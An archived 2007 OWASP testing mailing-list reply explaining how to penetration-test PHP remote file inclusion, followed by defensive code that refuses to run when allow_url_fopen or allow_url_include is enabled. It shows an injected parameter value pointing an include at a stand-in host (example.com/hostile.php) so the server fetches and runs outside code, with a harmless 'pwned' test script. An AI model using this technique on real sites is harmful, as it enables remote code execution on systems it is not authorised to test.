<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-testing] Remote File include vulnerability
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-testing%40lists.owasp.org?Subject=%5BOwasp-testing%5D%20Remote%20File%20include%20vulnerability&In-Reply-To=d7559bfd0704100945m3b6cef68uc90da5457a7be952%40mail.gmail.com">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001427.html">
   <LINK REL="Next"  HREF="001429.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-testing] Remote File include vulnerability</H1>
    <B>Andrew van der Stock</B> 
    <A HREF="mailto:owasp-testing%40lists.owasp.org?Subject=%5BOwasp-testing%5D%20Remote%20File%20include%20vulnerability&In-Reply-To=d7559bfd0704100945m3b6cef68uc90da5457a7be952%40mail.gmail.com"
       TITLE="[Owasp-testing] Remote File include vulnerability">vanderaj at owasp.org
       </A><BR>
    <I>Tue Apr 10 13:29:32 EDT 2007</I>
    <P><UL>
        <LI>Previous message: <A HREF="001427.html">[Owasp-testing] Remote File include vulnerability
</A></li>
        <LI>Next message: <A HREF="001429.html">[Owasp-testing] Remote File include vulnerability
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1428">[ date ]</a>
              <a href="thread.html#1428">[ thread ]</a>
              <a href="subject.html#1428">[ subject ]</a>
              <a href="author.html#1428">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Hi there,

You will generally find a construct like this:

require ($foo.&#185;.inc.php&#185;);

To obviate this, you need to do two things:

Install a file somewhere on the Internet or on your computer if you&#185;re
testing locally (recommended). I like

&lt;?php
echo &quot;pwned&quot;;
exit;
?&gt;

Change the variable, foo, to point at your script. If $foo is from a
variable from the user, like foo in the post, get or cookie collection, you
need something like a browser or at worst, Firefox Web Developer toolbar or
WebScarab to modify the contents of foo to:

<A HREF="http://www.example.com/hostile.php?dummy=">http://www.example.com/hostile.php?dummy=</A>

That way, your script is called like this:

<A HREF="http://www.example.com/hostile.php?dummy=.inc.php">http://www.example.com/hostile.php?dummy=.inc.php</A>

The PHP interpreter (which will almost always have allow_url_fopen turned on
&#173; STUPID!, STUPID!, STUPID! A friendly message to our PHP developer friends)
will then retrieve, tokenize and execute your script as if it were local to
the file system.

My view is that scripts should have the following code before any include /
require statements and definitely before any file or stream operations:

if ( ini_get(&#140;allow_url_fopen&#185;) == &#179;1&#178; &amp;&amp;
        @ini_set(&#140;allow_url_fopen&#185;, &#140;0&#185;) === false ) {
    die &#179;Cannot continue &#173; allow_url_fopen is set to 1, which is extremely
dangerous. Disable this in php.ini before continuing&#178;;
}
// PHP 5.2.0 and later
if ( ini_get(&#140;allow_url_include&#185;) == &#179;1&#178; &amp;&amp;
        @ini_set(&#140;allow_url_include&#185;, &#140;0&#185;) === false ) {
    die &#179;Cannot continue &#173; allow_url_fopen is set to 1, which is extremely
dangerous. Disable this in php.ini before continuing&#178;;
}

Andrew
 


On 4/10/07 12:45 PM, &quot;Denise Spiteri&quot; &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-testing">denise.spi at gmail.com</A>&gt; wrote:

&gt;<i> Hi to all, 
</I>&gt;<i>  
</I>&gt;<i>             Can someone please tell me, how to carry out penetration testing
</I>&gt;<i> for Remote File Include Vulnerability?
</I>&gt;<i>  
</I>&gt;<i> Denise
</I>&gt;<i>  
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Owasp-testing mailing list
</I>&gt;<i> <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-testing">Owasp-testing at lists.owasp.org</A>
</I>&gt;<i> <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-testing">http://lists.owasp.org/mailman/listinfo/owasp-testing</A>
</I>


</PRE>


<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001427.html">[Owasp-testing] Remote File include vulnerability
</A></li>
	<LI>Next message: <A HREF="001429.html">[Owasp-testing] Remote File include vulnerability
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1428">[ date ]</a>
              <a href="thread.html#1428">[ thread ]</a>
              <a href="subject.html#1428">[ subject ]</a>
              <a href="author.html#1428">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="http://lists.owasp.org/mailman/listinfo/owasp-testing">More information about the Owasp-testing
mailing list</a><br>
</body></html>
